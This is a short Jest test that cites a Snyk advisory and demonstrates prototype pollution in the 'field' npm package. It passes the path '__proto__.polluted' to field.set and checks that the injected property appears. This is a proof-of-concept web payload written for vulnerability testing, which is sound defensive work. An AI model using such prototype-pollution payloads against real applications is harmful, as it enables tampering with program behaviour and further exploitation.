//https://snyk.io/vuln/SNYK-JS-FIELD-1039884
test("prototype pollution in field ", () => {
    
    const field = require('field');
    var obj = {}

    expect({}.polluted).toBe(undefined);
    

    field.set(obj, '__proto__.polluted', "yes");
    expect(obj.polluted).toBe("yes");
  });